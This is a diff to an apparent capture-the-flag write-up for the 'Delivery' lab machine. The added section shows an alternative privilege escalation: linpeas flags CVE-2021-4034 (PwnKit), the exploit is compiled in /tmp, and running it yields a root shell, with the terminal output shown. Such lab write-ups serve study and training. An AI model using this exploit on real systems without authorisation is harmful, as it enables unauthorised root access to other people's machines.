@@ -262,3 +262,19 @@ if re.search(r'^[0-9]*@delivery.htb$', rcpttos):
 ```
 
 Apart from that, we realize that we are able to obtain access to http://helpdesk.delivery.htb/scp/login.php using the credentials that we have obtained in the mattermost channel earlier. 
+
+### Alternative method of privilege escalation
+Using linpeas, we notice that the server is vulnerable to CVE-2021-4034. We can then download the exploit script and execute the scipt to obtain root privileges
+
+```
+maildeliverer@Delivery:/tmp/exploit/CVE-2021-4034$ make
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+maildeliverer@Delivery:/tmp/exploit/CVE-2021-4034$ ./cve-2021-4034
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(maildeliverer)
+# 
+```
